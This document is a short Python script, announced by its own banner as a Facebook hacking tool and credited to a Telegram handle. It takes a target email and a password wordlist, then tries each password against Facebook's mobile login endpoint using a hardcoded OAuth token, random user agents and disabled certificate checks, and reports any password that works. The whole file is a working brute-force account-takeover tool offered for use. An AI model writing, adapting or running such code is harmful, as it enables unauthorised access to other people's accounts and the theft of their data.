import requests
import random
from time import sleep
import json
import sys
import os
import uuid
from user_agent import generate_user_agent
from requests.packages.urllib3.exceptions import InsecureRequestWarning

R = '\033[2;31m'
G = '\033[2;32m'
Y = '\033[2;33m'
P = '\033[2;34m'
H = '\033[2;35m'
C = '\033[2;36m'
W = '\033[2;37m'
de = 'https://t.me/deadcode_22'
d = 0
os.system('clear')
os.system('figlet -f mono9  Hake Facebock|lolcat ')

print('\n'+H+' - '*20+'\n'+P+' ( + ) '+' dev &» '+ C+de+'\n'+H+' - '*20)

email = input(P+' ( + ) '+Y+'Enter Email Facebock: '+W)
bass = input(P+' ( + ) '+Y+'Enter List Password : '+W)
try:
    file = open(f'{bass}', "r")
except:
    exit(R+' ♕ Not found your list ')
while True:
    re = file.readline().split('\n')[0]
    d += 1
    if re =='':
        exit(R+' List is finished ')    
    password = str(re)
    
    try:
     url = "https://b-graph.facebook.com/auth/login"
     headers = {
			"authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
			"user-agent": str(generate_user_agent())
		}
     data = f"email={email}&password={password}&credentials_type=password&error_detail_type=button_with_disabled&format=json&device_id={uuid.uuid4()}&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&method=POST"
     requests.packages.urllib3.disable_warnings(InsecureRequestWarning)     
     response = requests.post(url, data=data, headers=headers, verify=False, timeout=15).json()
    except:
     pass
     
    if list(response)[0] == "session_key":
        print(P+' ( + ) '+G+f'Good Password {W}({G}{password}{W}) ')
        acc = f"""
⌯ email successful ✅ ⌯         
. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .        
⌯ Number ➥ {email}                    
⌯ Password ➥ {password}                
. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .        
⚖️ Tele : @deadcode_22    """
        print(acc)
        sys.exit(P+' ( + ) '+Y+'See You Soon ')
    else:
        print(P+' ( + ) '+R+f'Bad Password {W}({R}{password}{W}) ({d}) ')                       
        sleep(1)                        